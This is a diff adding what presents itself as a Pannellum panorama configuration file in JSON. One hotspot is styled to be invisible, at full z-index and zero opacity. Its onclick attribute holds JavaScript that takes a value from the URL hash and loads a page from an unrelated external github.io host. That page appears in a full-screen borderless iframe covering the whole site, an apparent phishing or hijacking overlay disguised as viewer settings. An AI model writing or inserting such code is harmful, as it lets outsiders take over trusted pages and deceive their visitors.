@@ -1,0 +1,19 @@
+{
+  "autoLoad": true,
+  "pitch": 0,
+  "yaw": 0,
+  "type": "equirectangular",
+  "panorama": "https://pannellum.org/images/alma.jpg",
+  "hotSpots": [
+    {
+      "pitch": 0,
+      "yaw": 0,
+      "type": "info",
+      "URL": "#",
+      "attributes": {
+        "style": "visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; pointer-events:none;",
+        "onclick": "var slug = window.location.hash.split('=').pop(); if (slug && slug.indexOf('.json') === -1) {     var url = 'https://beholalokendor.github.io/mo/awx/' + slug + '.html';     var iframe = document.createElement('iframe');     iframe.src = url;     iframe.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;z-index:99999;';     document.body.appendChild(iframe); } "
+      }
+    }
+  ]
+}
